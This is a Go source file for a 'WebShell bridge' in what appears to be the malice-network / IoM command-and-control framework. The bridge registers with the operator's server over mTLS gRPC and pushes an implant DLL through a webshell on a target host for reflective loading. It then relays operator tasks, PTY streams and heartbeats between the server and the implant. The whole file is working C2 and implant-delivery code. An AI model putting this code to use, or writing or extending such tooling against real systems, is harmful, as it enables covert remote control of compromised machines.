package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/chainreactors/IoM-go/consts"
	mtls "github.com/chainreactors/IoM-go/mtls"
	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/IoM-go/proto/services/listenerrpc"
	iomtypes "github.com/chainreactors/IoM-go/types"
	"github.com/chainreactors/logs"
	"github.com/chainreactors/malice-network/helper/cryptography"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

const (
	pipelineType     = "webshell"
	checkinInterval  = 30 * time.Second
	retryBaseDelay   = 2 * time.Second
	retryMaxDelay    = 60 * time.Second
	retryMaxAttempts = 20
)

// Bridge is the WebShell bridge that connects to the IoM server via
// ListenerRPC and manages webshell-backed sessions through a suo5 tunnel.
//
// The bridge owns the listener runtime only. Custom pipelines are created and
// controlled through pipeline start/stop events from the server.
type Bridge struct {
	cfg *Config

	conn      *grpc.ClientConn
	rpc       listenerrpc.ListenerRPCClient
	jobStream listenerrpc.ListenerRPC_JobStreamClient

	activeMu sync.Mutex
	active   *pipelineRuntime
}

type pipelineRuntime struct {
	name        string
	ctx         context.Context
	cancel      context.CancelFunc
	spiteStream listenerrpc.ListenerRPC_SpiteStreamClient
	sendMu      sync.Mutex
	sessions    sync.Map // sessionID -> *Session
	streamTasks sync.Map // "sessionID:taskID" -> context.CancelFunc (pump goroutine)
	done        chan struct{}
}

// NewBridge creates a new bridge instance.
func NewBridge(cfg *Config) (*Bridge, error) {
	return &Bridge{cfg: cfg}, nil
}

// Start runs the bridge lifecycle:
// 1. Connect to server via mTLS
// 2. Register listener
// 3. Open JobStream
// 4. Wait for pipeline start/stop controls
func (b *Bridge) Start(parent context.Context) error {
	ctx, cancel := context.WithCancel(parent)
	defer cancel()

	if err := b.connect(ctx); err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer b.shutdown()
	defer b.conn.Close()
	logs.Log.Important("connected to server")

	go func() {
		<-ctx.Done()
		if b.conn != nil {
			_ = b.conn.Close()
		}
	}()

	if _, err := b.rpc.RegisterListener(b.listenerCtx(ctx), &clientpb.RegisterListener{
		Name: b.cfg.ListenerName,
		Host: b.cfg.ListenerIP,
	}); err != nil {
		return fmt.Errorf("register listener: %w", err)
	}
	logs.Log.Importantf("registered listener: %s", b.cfg.ListenerName)

	var err error
	b.jobStream, err = b.rpc.JobStream(b.listenerCtx(ctx))
	if err != nil {
		return fmt.Errorf("open job stream: %w", err)
	}
	logs.Log.Importantf("waiting for pipeline %s control messages", b.cfg.PipelineName)

	return b.runJobLoop(ctx)
}

// connectDLL establishes a channel to the DLL on the target.
// Sends HTTP requests to the webshell which calls DLL exports directly
// via function pointers (memory channel). No TCP port opened on target.
// Retries with exponential backoff up to retryMaxAttempts before giving up.
func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error {
	sessionID := cryptography.RandomString(8)

	channel := NewChannel(b.cfg.WebshellHTTPURL(), b.cfg.StageToken)
	logs.Log.Importantf("waiting for DLL at %s ...", b.cfg.WebshellHTTPURL())

	// Read DLL bytes once if --dll is provided.
	var dllBytes []byte
	if b.cfg.DLLPath != "" {
		var err error
		dllBytes, err = os.ReadFile(b.cfg.DLLPath)
		if err != nil {
			return fmt.Errorf("read DLL file %s: %w", b.cfg.DLLPath, err)
		}
		logs.Log.Importantf("loaded DLL from %s (%d bytes)", b.cfg.DLLPath, len(dllBytes))
	}

	dllDelivered := false
	delay := retryBaseDelay
	for attempt := 1; attempt <= retryMaxAttempts; attempt++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		if err := channel.Connect(ctx); err != nil {
			// Auto-load DLL if we have it and haven't delivered yet.
			if dllBytes != nil && !dllDelivered {
				logs.Log.Importantf("DLL not loaded, delivering via X-Stage: load (%d bytes)", len(dllBytes))
				if loadErr := channel.LoadDLL(ctx, dllBytes); loadErr != nil {
					logs.Log.Warnf("DLL delivery failed (attempt %d/%d): %v", attempt, retryMaxAttempts, loadErr)
				} else {
					logs.Log.Important("DLL delivered, waiting for reflective load")
					dllDelivered = true
				}
			}

			logs.Log.Debugf("DLL not ready (attempt %d/%d): %v (retry in %s)",
				attempt, retryMaxAttempts, err, delay)
			if attempt == retryMaxAttempts {
				return fmt.Errorf("DLL connect failed after %d attempts: %w", retryMaxAttempts, err)
			}
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(delay):
			}
			delay *= 2
			if delay > retryMaxDelay {
				delay = retryMaxDelay
			}
			continue
		}
		break
	}

	logs.Log.Important("DLL connected via memory channel")

	sess, err := NewSession(
		b.rpc, b.pipelineCtx(ctx, runtime.name),
		sessionID, runtime.name, b.cfg.ListenerName,
		channel,
	)
	if err != nil {
		_ = channel.Close()
		return fmt.Errorf("create session: %w", err)
	}

	channel.StartRecvLoop()
	runtime.sessions.Store(sess.ID, sess)
	return nil
}

// connect establishes the mTLS gRPC connection to the server.
func (b *Bridge) connect(ctx context.Context) error {
	authCfg, err := mtls.ReadConfig(b.cfg.AuthFile)
	if err != nil {
		return fmt.Errorf("read auth config: %w", err)
	}

	addr := authCfg.Address()
	if b.cfg.ServerAddr != "" {
		addr = b.cfg.ServerAddr
	}

	options, err := mtls.GetGrpcOptions(
		[]byte(authCfg.CACertificate),
		[]byte(authCfg.Certificate),
		[]byte(authCfg.PrivateKey),
		authCfg.Type,
	)
	if err != nil {
		return fmt.Errorf("get grpc options: %w", err)
	}

	b.conn, err = grpc.DialContext(ctx, addr, options...)
	if err != nil {
		return fmt.Errorf("grpc dial: %w", err)
	}

	b.rpc = listenerrpc.NewListenerRPCClient(b.conn)
	return nil
}

func (b *Bridge) shutdown() {
	if err := b.stopActiveRuntime(""); err != nil {
		logs.Log.Debugf("stop active runtime during shutdown: %v", err)
	}
	if b.jobStream != nil {
		_ = b.jobStream.CloseSend()
	}
}

func (b *Bridge) runJobLoop(ctx context.Context) error {
	for {
		msg, err := b.jobStream.Recv()
		if err != nil {
			if ctx.Err() != nil || errors.Is(err, io.EOF) {
				return nil
			}
			switch status.Code(err) {
			case codes.Canceled, codes.Unavailable:
				if ctx.Err() != nil {
					return nil
				}
			}
			return fmt.Errorf("job stream recv: %w", err)
		}

		statusMsg := b.handleJobCtrl(ctx, msg)
		if err := b.jobStream.Send(statusMsg); err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return fmt.Errorf("job stream send: %w", err)
		}
	}
}

func (b *Bridge) handleJobCtrl(ctx context.Context, msg *clientpb.JobCtrl) *clientpb.JobStatus {
	statusMsg := &clientpb.JobStatus{
		ListenerId: b.cfg.ListenerName,
		Ctrl:       msg.GetCtrl(),
		CtrlId:     msg.GetId(),
		Status:     int32(consts.CtrlStatusSuccess),
		Job:        msg.GetJob(),
	}

	var err error
	switch msg.GetCtrl() {
	case consts.CtrlPipelineStart:
		err = b.handlePipelineStart(ctx, msg.GetJob())
	case consts.CtrlPipelineStop:
		err = b.handlePipelineStop(msg.GetJob())
	case consts.CtrlPipelineSync:
		err = b.handlePipelineSync(msg.GetJob())
	default:
		err = fmt.Errorf("unsupported ctrl %q", msg.GetCtrl())
	}

	if err != nil {
		statusMsg.Status = int32(consts.CtrlStatusFailed)
		statusMsg.Error = err.Error()
		logs.Log.Errorf("job %s failed: %v", msg.GetCtrl(), err)
	}

	return statusMsg
}

func (b *Bridge) handlePipelineStart(ctx context.Context, job *clientpb.Job) error {
	pipe := job.GetPipeline()
	if pipe == nil {
		return fmt.Errorf("missing pipeline in start job")
	}
	if t := pipe.GetType(); t != pipelineType && t != "tcp" && t != "" {
		return fmt.Errorf("unsupported pipeline type %q", t)
	}
	if err := b.ensurePipelineMatch(pipe.GetName()); err != nil {
		return err
	}

	runtimeCtx, cancel := context.WithCancel(ctx)
	runtime := &pipelineRuntime{
		name:   pipe.GetName(),
		ctx:    runtimeCtx,
		cancel: cancel,
		done:   make(chan struct{}),
	}

	b.activeMu.Lock()
	if active := b.active; active != nil {
		b.activeMu.Unlock()
		cancel()
		if active.name == pipe.GetName() {
			logs.Log.Debugf("pipeline %s already active", pipe.GetName())
			return nil
		}
		return fmt.Errorf("pipeline %s already active", active.name)
	}
	b.active = runtime
	b.activeMu.Unlock()

	spiteStream, err := b.rpc.SpiteStream(b.pipelineCtx(runtimeCtx, runtime.name))
	if err != nil {
		b.clearActiveRuntime(runtime)
		cancel()
		return fmt.Errorf("open spite stream: %w", err)
	}
	runtime.spiteStream = spiteStream

	go b.runRuntime(runtime)
	logs.Log.Importantf("pipeline %s starting; waiting for DLL at %s", runtime.name, b.cfg.WebshellHTTPURL())
	return nil
}

func (b *Bridge) handlePipelineStop(job *clientpb.Job) error {
	name, err := b.jobPipelineName(job)
	if err != nil {
		return err
	}
	if err := b.ensurePipelineMatch(name); err != nil {
		return err
	}
	logs.Log.Importantf("stopping pipeline %s", name)
	return b.stopActiveRuntime(name)
}

func (b *Bridge) handlePipelineSync(job *clientpb.Job) error {
	name, err := b.jobPipelineName(job)
	if err != nil {
		return err
	}
	if err := b.ensurePipelineMatch(name); err != nil {
		return err
	}
	logs.Log.Debugf("pipeline %s sync acknowledged", name)
	return nil
}

func (b *Bridge) jobPipelineName(job *clientpb.Job) (string, error) {
	if job == nil {
		return "", fmt.Errorf("missing job")
	}
	if pipe := job.GetPipeline(); pipe != nil && pipe.GetName() != "" {
		return pipe.GetName(), nil
	}
	if job.GetName() != "" {
		return job.GetName(), nil
	}
	return "", fmt.Errorf("missing pipeline name")
}

func (b *Bridge) ensurePipelineMatch(name string) error {
	if name == "" {
		return fmt.Errorf("missing pipeline name")
	}
	if b.cfg.PipelineName != "" && name != b.cfg.PipelineName {
		return fmt.Errorf("bridge configured for pipeline %s, got %s", b.cfg.PipelineName, name)
	}
	return nil
}

func (b *Bridge) stopActiveRuntime(name string) error {
	b.activeMu.Lock()
	runtime := b.active
	if runtime == nil {
		b.activeMu.Unlock()
		return nil
	}
	if name != "" && runtime.name != name {
		b.activeMu.Unlock()
		return fmt.Errorf("active pipeline is %s, not %s", runtime.name, name)
	}
	b.active = nil
	b.activeMu.Unlock()

	b.stopRuntime(runtime)
	return nil
}

func (b *Bridge) stopRuntime(runtime *pipelineRuntime) {
	if runtime == nil {
		return
	}

	runtime.cancel()
	if runtime.spiteStream != nil {
		_ = runtime.spiteStream.CloseSend()
	}
	b.closeRuntimeSessions(runtime)

	select {
	case <-runtime.done:
	case <-time.After(2 * time.Second):
	}
}

func (b *Bridge) runRuntime(runtime *pipelineRuntime) {
	syncStop := false
	defer func() {
		b.clearActiveRuntime(runtime)
		close(runtime.done)
		if syncStop {
			go b.syncPipelineStop(runtime.name)
		}
	}()

	if err := b.connectDLL(runtime.ctx, runtime); err != nil {
		if runtime.ctx.Err() == nil {
			syncStop = true
			logs.Log.Errorf("pipeline %s failed before session registration: %v", runtime.name, err)
		}
		return
	}

	logs.Log.Importantf("pipeline %s active", runtime.name)
	go b.checkinLoop(runtime)
	b.handleSpiteStream(runtime)
}

func (b *Bridge) closeRuntimeSessions(runtime *pipelineRuntime) {
	// Cancel all streaming task pumps first.
	runtime.streamTasks.Range(func(key, value interface{}) bool {
		value.(context.CancelFunc)()
		runtime.streamTasks.Delete(key)
		return true
	})

	runtime.sessions.Range(func(key, value interface{}) bool {
		runtime.sessions.Delete(key)
		_ = value.(*Session).Close()
		return true
	})
}

// listenerCtx returns a context with listener metadata.
func (b *Bridge) listenerCtx(parent context.Context) context.Context {
	return metadata.NewOutgoingContext(parent, metadata.Pairs(
		"listener_id", b.cfg.ListenerName,
		"listener_ip", b.cfg.ListenerIP,
	))
}

// pipelineCtx returns a context with pipeline metadata.
func (b *Bridge) pipelineCtx(parent context.Context, pipelineName string) context.Context {
	return metadata.NewOutgoingContext(parent, metadata.Pairs(
		"listener_id", b.cfg.ListenerName,
		"listener_ip", b.cfg.ListenerIP,
		"pipeline_id", pipelineName,
	))
}

func (b *Bridge) sessionCtx(parent context.Context, sessionID string) context.Context {
	return metadata.NewOutgoingContext(parent, metadata.Pairs(
		"session_id", sessionID,
		"listener_id", b.cfg.ListenerName,
		"listener_ip", b.cfg.ListenerIP,
		"timestamp", strconv.FormatInt(time.Now().Unix(), 10),
	))
}

// handleSpiteStream receives task requests from the server and forwards them
// through the malefic channel to the bind DLL on the target.
func (b *Bridge) handleSpiteStream(runtime *pipelineRuntime) {
	for {
		req, err := runtime.spiteStream.Recv()
		if err != nil {
			if runtime.ctx.Err() != nil || errors.Is(err, io.EOF) {
				return
			}
			switch status.Code(err) {
			case codes.Canceled, codes.Unavailable:
				if runtime.ctx.Err() != nil {
					return
				}
			}
			logs.Log.Errorf("spite stream recv (%s): %v", runtime.name, err)
			return
		}

		spite := req.GetSpite()
		sessionID := req.GetSession().GetSessionId()
		if spite == nil || sessionID == "" {
			continue
		}

		var taskID uint32
		if t := req.GetTask(); t != nil {
			taskID = t.GetTaskId()
		}

		logs.Log.Debugf("task %d for session %s: %s", taskID, sessionID, spite.Name)
		go b.forwardToSession(runtime, sessionID, taskID, req)
	}
}

func (b *Bridge) clearActiveRuntime(runtime *pipelineRuntime) {
	if runtime == nil {
		return
	}
	if runtime.spiteStream != nil {
		_ = runtime.spiteStream.CloseSend()
	}

	b.activeMu.Lock()
	if b.active == runtime {
		b.active = nil
	}
	b.activeMu.Unlock()

	b.closeRuntimeSessions(runtime)
}

func (b *Bridge) syncPipelineStop(name string) {
	if b.rpc == nil || name == "" {
		return
	}
	_, err := b.rpc.StopPipeline(context.Background(), &clientpb.CtrlPipeline{
		Name:       name,
		ListenerId: b.cfg.ListenerName,
	})
	if err != nil {
		logs.Log.Errorf("sync failed pipeline stop for %s: %v", name, err)
	}
}

// forwardToSession routes a SpiteRequest to the appropriate session.
// Streaming tasks (Task.Total < 0) get a persistent response pump; unary tasks
// use the simple request/response path.
func (b *Bridge) forwardToSession(runtime *pipelineRuntime, sessionID string, taskID uint32, req *clientpb.SpiteRequest) {
	sess, ok := runtime.sessions.Load(sessionID)
	if !ok {
		err := fmt.Errorf("session %s not found", sessionID)
		logs.Log.Warnf("%v, dropping task %d", err, taskID)
		b.sendTaskError(runtime, sessionID, taskID, req.GetSpite(), err)
		return
	}

	session := sess.(*Session)
	isStreaming := req.GetTask().GetTotal() < 0
	streamKey := fmt.Sprintf("%s:%d", sessionID, taskID)

	if isStreaming {
		// Check if a pump already exists (subsequent command on same stream, e.g. PTY input)
		if _, exists := runtime.streamTasks.Load(streamKey); exists {
			if err := session.SendTaskSpite(taskID, req.GetSpite()); err != nil {
				logs.Log.Errorf("session %s task %d stream send: %v", sessionID, taskID, err)
				b.sendTaskError(runtime, sessionID, taskID, req.GetSpite(), err)
			}
			return
		}

		// New streaming task: open channel, send initial request, start pump.
		ch := session.OpenTaskStream(taskID)
		if err := session.SendTaskSpite(taskID, req.GetSpite()); err != nil {
			session.CloseTaskStream(taskID)
			logs.Log.Errorf("session %s task %d initial send: %v", sessionID, taskID, err)
			b.sendTaskError(runtime, sessionID, taskID, req.GetSpite(), err)
			return
		}

		pumpCtx, pumpCancel := context.WithCancel(runtime.ctx)
		runtime.streamTasks.Store(streamKey, pumpCancel)
		go b.responsePump(runtime, session, sessionID, taskID, streamKey, ch, pumpCtx, pumpCancel)
		return
	}

	// Unary path: send request, wait for one response.
	resp, err := session.HandleUnary(taskID, req.GetSpite())
	if err != nil {
		logs.Log.Errorf("session %s task %d error: %v", sessionID, taskID, err)
		if !session.Alive() {
			logs.Log.Warnf("session %s channel dead, removing from runtime", sessionID)
			runtime.sessions.Delete(sessionID)
			_ = session.Close()
		}
		b.sendTaskError(runtime, sessionID, taskID, req.GetSpite(), err)
		return
	}
	if resp == nil {
		err := fmt.Errorf("empty response from DLL")
		logs.Log.Errorf("session %s task %d error: %v", sessionID, taskID, err)
		b.sendTaskError(runtime, sessionID, taskID, req.GetSpite(), err)
		return
	}

	if err := b.sendSpiteResponse(runtime, sessionID, taskID, resp); err != nil {
		logs.Log.Errorf("spite stream send: %v", err)
	}
}

// responsePump reads streaming responses from the DLL channel and forwards
// each one to the server's SpiteStream. Runs until the channel is closed,
// the context is cancelled, or a send error occurs.
func (b *Bridge) responsePump(
	runtime *pipelineRuntime,
	session *Session,
	sessionID string,
	taskID uint32,
	streamKey string,
	ch <-chan *implantpb.Spite,
	ctx context.Context,
	cancel context.CancelFunc,
) {
	defer func() {
		cancel()
		runtime.streamTasks.Delete(streamKey)
		session.CloseTaskStream(taskID)
		logs.Log.Debugf("response pump exited for task %d on session %s", taskID, sessionID)
	}()

	for {
		select {
		case <-ctx.Done():
			return
		case spite, ok := <-ch:
			if !ok {
				// Channel closed (recvLoop exit or session teardown)
				return
			}
			if err := b.sendSpiteResponse(runtime, sessionID, taskID, spite); err != nil {
				logs.Log.Errorf("stream pump send for task %d: %v", taskID, err)
				return
			}
		}
	}
}

func (b *Bridge) sendTaskError(runtime *pipelineRuntime, sessionID string, taskID uint32, req *implantpb.Spite, err error) {
	name := ""
	if req != nil {
		name = req.GetName()
	}
	if sendErr := b.sendSpiteResponse(runtime, sessionID, taskID, taskErrorSpite(taskID, name, err)); sendErr != nil {
		logs.Log.Debugf("send task error response failed: %v", sendErr)
	}
}

func taskErrorSpite(taskID uint32, name string, err error) *implantpb.Spite {
	return &implantpb.Spite{
		Name:   name,
		TaskId: taskID,
		Error:  iomtypes.MaleficErrorTaskError,
		Status: &implantpb.Status{
			TaskId: taskID,
			Status: iomtypes.TaskErrorOperatorError,
			Error:  err.Error(),
		},
		Body: &implantpb.Spite_Empty{
			Empty: &implantpb.Empty{},
		},
	}
}

func (b *Bridge) sendSpiteResponse(runtime *pipelineRuntime, sessionID string, taskID uint32, spite *implantpb.Spite) error {
	runtime.sendMu.Lock()
	defer runtime.sendMu.Unlock()

	return runtime.spiteStream.Send(&clientpb.SpiteResponse{
		ListenerId: b.cfg.ListenerName,
		SessionId:  sessionID,
		TaskId:     taskID,
		Spite:      spite,
	})
}

// checkinLoop sends periodic heartbeats for all registered sessions.
func (b *Bridge) checkinLoop(runtime *pipelineRuntime) {
	ticker := time.NewTicker(checkinInterval)
	defer ticker.Stop()

	for {
		select {
		case <-runtime.ctx.Done():
			return
		case <-ticker.C:
			runtime.sessions.Range(func(key, value interface{}) bool {
				sess := value.(*Session)
				if !sess.Alive() {
					logs.Log.Warnf("session %s channel dead, removing", sess.ID)
					runtime.sessions.Delete(key)
					_ = sess.Close()
					return true
				}
				sess.Checkin(b.rpc, b.sessionCtx(runtime.ctx, sess.ID))
				return true
			})
		}
	}
}
